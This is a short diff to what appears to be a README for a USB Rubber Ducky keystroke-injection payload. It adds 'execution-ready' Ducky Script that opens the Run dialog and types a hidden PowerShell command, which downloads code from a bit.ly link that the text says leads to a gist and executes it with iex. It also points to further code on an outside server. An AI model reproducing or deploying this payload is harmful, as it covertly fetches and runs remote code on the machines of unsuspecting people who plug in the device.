@@ -1,3 +1,16 @@
+Pre-written and execution-ready code:
+
+If you do not have access to a web server and want to get this running, here is pre-uploaded code. The bitlink points to [this gist](https://gist.github.com/judge2020/034d6201d6b24f079e0d692bea3e92b0) containing the PS code, and the image is hosted on github directly.
+
+```
+SLEEP 600
+GUI r
+DELAY 150
+STRING powershell -windowstyle hidden iex (wget http://bit.ly/2f1uwGD)
+ENTER
+```
+
+
 GET THE CODE SNIPS HERE:
 
 http://lostserver.com/static/rubberduckcode.txt
